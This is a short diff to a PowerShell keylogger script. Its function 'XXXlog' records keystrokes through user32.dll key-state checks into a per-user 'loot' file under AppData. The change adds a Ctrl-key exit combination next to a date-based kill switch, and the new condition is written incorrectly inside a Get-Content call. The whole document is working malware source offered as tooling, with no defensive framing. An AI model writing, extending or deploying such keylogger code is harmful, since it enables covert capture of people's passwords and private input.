@@ -1,3 +1,8 @@
+Add-Type -AssemblyName WindowsBase
+Add-Type -AssemblyName PresentationCore
+$Lctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'LeftCtrl')
+$Rctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'RightCtrl')
+
 function XXXlog($Path="$env:appdata\-locker\$env:UserName-loot.txt"){
   $signatures = @'
   [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
@@ -21,7 +26,7 @@ function XXXlog($Path="$env:appdata\-locker\$env:UserName-loot.txt"){
 
     while ($true) {
       Start-Sleep -Milliseconds 40
-      if((get-date) -gt (Get-content "$env:appdata\-locker\killswitch.txt")){exit}
+      if((get-date) -gt (Get-content "$env:appdata\-locker\killswitch.txt" -or $Rctrl -and $Lctrl)){exit}
       
 
       for ($ascii = 9; $ascii -le 254; $ascii++) {
